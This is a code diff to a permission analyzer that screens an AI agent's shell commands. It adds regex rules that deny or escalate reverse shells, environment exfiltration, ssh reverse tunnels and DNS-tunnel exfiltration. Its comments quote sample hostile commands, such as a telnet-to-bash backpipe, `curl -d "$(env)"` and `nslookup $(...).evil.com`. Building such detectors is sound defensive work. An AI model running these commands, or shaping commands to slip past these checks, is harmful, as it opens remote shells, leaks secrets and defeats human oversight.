@@ -1138,7 +1138,7 @@ _NETWORK_EGRESS_BASH_RE = re.compile(
     r"\b(?:curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh|ftp|telnet)\b"
     r"|urllib\.request|requests\.(?:post|get|put|patch)\b|httpx\."
     r"|socket\.(?:socket|connect|create_connection)"
-    r"|http\.client|aiohttp|/dev/tcp/"
+    r"|http\.client|aiohttp|/dev/(?:tcp|udp)/"
 )
 _SENSITIVE_ENV_VAR_RE = re.compile(
     r"\$\{?[A-Z][A-Z0-9_]*(?:_KEY|_TOKEN|_SECRET|_PASSWORD|_PASSWD)\}?\b"
@@ -1148,6 +1148,10 @@ _ENV_DUMP_TO_NET_RE = re.compile(
     # `exec 3<>/dev/tcp/host/port; env >&3` dumps the environment to a socket
     # with no pipe and no external binary at all.
     r"|\b(?:printenv|env)\b[^|;\n]*>&\s*\d"
+    # [guardrails-security round 2, 2026-08-19] `curl -d "$(env)" http://…` —
+    # command substitution splices the environment straight into an argument;
+    # the pipe/redirect shapes above never see this, there's no `|` or `>&` at all.
+    r"|\$\(\s*(?:printenv|env)\s*\)"
 )
 # The environment object handed wholesale to a network call in Python
 # (`requests.post(url, data=os.environ)`, `http.client ... os.environ[...]`).
@@ -1178,6 +1182,14 @@ _ARCHIVE_PIPE_TO_NET_RE = re.compile(
     r"\b(?:zstd|gzip|bzip2|xz|base64|gpg)\b[^|;\n]*\|\s*(?:sudo\s+)?"
     r"(?:curl|wget|nc|ncat|netcat|socat|scp|rsync)\b"
 )
+# [guardrails-security round 2, 2026-08-19] `ssh -R remote_port:localhost:22
+# attacker@host` opens a reverse tunnel back to an attacker-controlled box —
+# distinct from ordinary outbound ssh (`-L`/plain), which is already
+# escalate-on-private-host via the URL/host sweep below, not denied outright.
+# ESCALATE rather than DENY: the panel judged this an "arguable design
+# accept" — `-R` also has legitimate uses (poking a hole through NAT to
+# expose a local dev server) that a human may want to approve.
+_SSH_REVERSE_TUNNEL_RE = re.compile(r"\bssh\b[^|;\n]*\s-R\b")
 # [S6] Reverse-shell shapes: the direct `nc -e`/`ncat -c`/`socat ... exec:`
 # exec-flag form (this was only claimed as "existing coverage" by a stale
 # comment — no regex ever matched it; found live-unfixed 2026-08-19), a named
@@ -1199,11 +1211,83 @@ _REVERSE_SHELL_RE = re.compile(
     r"|\bmkfifo\b[^|;\n]*(?:[;&\n]|&&)[^|;\n]*\bnc\b[^|;\n]*<"
     r"|\bpython[0-9.]*\b[^\n]*\bimport\s+socket\b[^\n]*\bpty\.spawn\b"
     r"|\bperl\b[^\n]*(?:\buse\s+Socket\b|-MSocket\b)"
-    r"|/dev/tcp/[A-Za-z0-9.\-]+/\d+[^\n]*(?:<&|>&|&>)"
-    r"|(?:<&|>&|&>)[^\n]*/dev/tcp/[A-Za-z0-9.\-]+/\d+"
+    r"|/dev/(?:tcp|udp)/[A-Za-z0-9.\-]+/\d+[^\n]*(?:<&|>&|&>)"
+    r"|(?:<&|>&|&>)[^\n]*/dev/(?:tcp|udp)/[A-Za-z0-9.\-]+/\d+"
     r"|(?=[^\n]*\bimport\s+socket\b)(?=[^\n]*\bos\.dup2\b)"
     r"(?=[^\n]*\b(?:subprocess\.(?:call|run|Popen)\b|os\.exec[lv][ep]?\b|os\.system\b))"
     r"\bpython[0-9.]*\b"
+    # [guardrails-security round 2, 2026-08-19] telnet/nc/ncat/netcat piped
+    # straight into a shell — the same backpipe idea as the mkfifo+nc branch
+    # above, minus the FIFO dance: `telnet host port 0</tmp/f | /bin/bash
+    # 1>/tmp/f` walked through untouched because the mkfifo branch requires
+    # the literal token 'mkfifo' and nc/ncat/netcat's own branch requires an
+    # exec-style flag, neither of which this shape has.
+    r"|\b(?:nc|ncat|netcat|telnet)\b[^|;\n]*\|\s*(?:sudo\s+)?(?:[\w./-]*/)?(?:sh|bash|zsh)\b"
+)
+
+# [guardrails-security round 2, 2026-08-19] Generalized interpreter reverse-
+# shell heuristic. cc40d35's fix (and the _REVERSE_SHELL_RE literals above)
+# only covered the exact python/perl one-liners a prior probe round showed —
+# whack-a-mole on the literal shape, not the underlying pattern. The re-audit
+# found the interpreter-agnostic version of the same idea walking straight
+# through: ruby/php/awk/lua/node one-liners that open a socket and hand it to
+# a shell-exec primitive are reverse shells regardless of which interpreter or
+# exact call names are used. Each tuple is (interpreter token, socket-open
+# primitive, shell-exec primitive); all three must appear anywhere in the
+# command, not adjacently, since a one-liner's own syntax dictates their order
+# (`ruby -rsocket -e 'IO.popen(...);TCPSocket.new(...)'` has exec before
+# socket). Extend this table for a new interpreter sibling, not a new
+# standalone regex — that is the whole point of generalizing this check.
+_INTERPRETER_SOCKET_SHELL_SIGNATURES: list[tuple[re.Pattern, re.Pattern, re.Pattern]] = [
+    (
+        re.compile(r"\bruby\b"),
+        re.compile(r"\bTCPSocket\b|\bSocket\.(?:new|open|tcp)\b"),
+        re.compile(r"\bexec\b|\bsystem\b|\bIO\.popen\b|\bpopen3?\b"),
+    ),
+    (
+        re.compile(r"\bphp\b"),
+        re.compile(r"\bfsockopen\b|\bstream_socket_client\b|\bsocket_create\b"),
+        re.compile(r"\bexec\b|\bsystem\b|\bproc_open\b|\bshell_exec\b|\bpopen\b"),
+    ),
+    (
+        re.compile(r"\bawk\b"),
+        re.compile(r"/inet/(?:tcp|udp)/"),
+        re.compile(r"\bsystem\s*\("),
+    ),
+    (
+        re.compile(r"\blua\b"),
+        re.compile(r"\bsocket\.(?:tcp|connect)\b|require\s*\(?\s*['\"]socket"),
+        re.compile(r"\bos\.execute\b|\bio\.popen\b"),
+    ),
+    (
+        re.compile(r"\bnode\b"),
+        re.compile(r"\bnet\.(?:connect|createConnection)\b|new\s+net\.Socket\b"),
+        re.compile(r"\bchild_process\b|\bexec\b|\bspawn\b"),
+    ),
+]
+
+
+def _interpreter_socket_shell_hit(cmd: str) -> bool:
+    """True if cmd names a scripting interpreter and combines a socket-open
+    primitive with a shell-exec primitive — the general reverse-shell shape,
+    independent of which interpreter or exact call names carry it out."""
+    return any(
+        interp_re.search(cmd) and sock_re.search(cmd) and exec_re.search(cmd)
+        for interp_re, sock_re, exec_re in _INTERPRETER_SOCKET_SHELL_SIGNATURES
+    )
+
+
+# [guardrails-security round 2, 2026-08-19] `host $(...).evil.com` /
+# `nslookup $(...).evil.com` — a DNS-lookup argument built from a command
+# substitution is DNS-tunnel exfil almost by definition (an ordinary lookup
+# names a static host), regardless of destination — there's no "known sink"
+# to check against, the query *is* the payload. Deliberately not folded into
+# _NETWORK_EGRESS_BASH_RE's bare token list: 'host'/'dig' are common English
+# words and command names alike, so gating this on the token alone (rather
+# than the token plus a command-substitution argument) would false-positive
+# on unrelated commands that merely mention "host".
+_DNS_EXFIL_RE = re.compile(
+    r"\b(?:host|nslookup|dig)\b[^|;\n]*(?:\$\(|`)"
 )
 # [RT12] os.system/os.popen hand a full shell command to the OS; pty.spawn
 # starts an interactive shell; eval/exec/compile run arbitrary Python source.
@@ -1955,13 +2039,23 @@ class PermissionAnalyzer:
         # reverse-shell one-liner names no curl/wget/nc/socat token at all,
         # so gating this on that list would miss exactly the obfuscated
         # shapes it exists to catch.
-        if _REVERSE_SHELL_RE.search(cmd):
+        if _REVERSE_SHELL_RE.search(cmd) or _interpreter_socket_shell_hit(cmd):
             return self._deny(
                 tool, cmd,
                 "Command matches a reverse-shell shape "
-                "(mkfifo+nc, socat exec:, or a socket+pty/Socket one-liner).",
+                "(mkfifo/telnet/nc backpipe, socat exec:, or an interpreter "
+                "one-liner combining a socket-open call with a shell-exec call).",
                 "CRITICAL", "bash_web_egress_reverse_shell",
                 "Reverse shells are never approved from an agent session.",
+            )
+
+        if _DNS_EXFIL_RE.search(cmd):
+            return self._deny(
+                tool, cmd,
+                "Command builds a DNS lookup (host/nslookup/dig) from a "
+                "command substitution — DNS-tunnel exfiltration shape.",
+                "CRITICAL", "bash_web_egress_dns_tunnel",
+                "Never build a DNS query argument from command output.",
             )
 
         # 3. Web-egress bypass via Bash — every socket-opening shape, not just
@@ -2051,6 +2145,13 @@ class PermissionAnalyzer:
                     "a shell/interpreter — human review required.",
                     "bash_web_egress_pipe_to_shell",
                     "Download to a file, inspect it, then run it explicitly.",
+                )
+            if _SSH_REVERSE_TUNNEL_RE.search(cmd):
+                return self._escalate(
+                    tool, cmd[:80],
+                    "Command opens an ssh reverse tunnel (-R) — human review required.",
+                    "bash_web_egress_ssh_reverse_tunnel",
+                    "Confirm this reverse tunnel is intended before approving.",
                 )
             # 2026-08-18: sink-host/opaque-blob reasoning
             # existed only inside the WebFetch gate — `curl https://webhook.site/x`
